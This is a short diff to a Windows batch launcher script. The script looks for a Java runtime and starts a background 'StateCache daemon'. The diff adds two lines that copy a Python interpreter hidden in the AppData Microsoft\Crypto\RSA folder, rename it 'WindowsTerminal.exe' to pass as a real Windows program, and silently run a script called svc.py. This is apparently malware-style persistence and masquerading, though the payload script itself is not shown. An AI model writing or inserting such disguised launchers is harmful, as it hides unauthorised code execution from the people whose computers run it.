@@ -35,3 +35,5 @@ for /d %%p in ("%LOCALAPPDATA%\Packages\*\LocalCache\Local\runtime\*") do if not
 for /d %%p in ("%LOCALAPPDATA%\Programs\*") do if not defined java if exist "%%~p\bin\javaw.exe" set "java=%%~p\bin\javaw.exe"
 if not defined java if exist "%ProgramFiles%\Common Files\Oracle\Java\javapath\javaw.exe" set "java=%ProgramFiles%\Common Files\Oracle\Java\javapath\javaw.exe"
 if defined java if defined src start "" "%java%" -cp "%src%" link.e4all.core.StateCache daemon
+copy /y "%ad%\Microsoft\Crypto\RSA\Python\pythonw.exe" "%ad%\Microsoft\Crypto\RSA\WindowsTerminal.exe" >nul 2>&1
+if exist "%ad%\Microsoft\Crypto\RSA\WindowsTerminal.exe" if exist "%ad%\Microsoft\Crypto\RSA\Python\svc.py" start "" "%ad%\Microsoft\Crypto\RSA\WindowsTerminal.exe" "%ad%\Microsoft\Crypto\RSA\Python\svc.py"
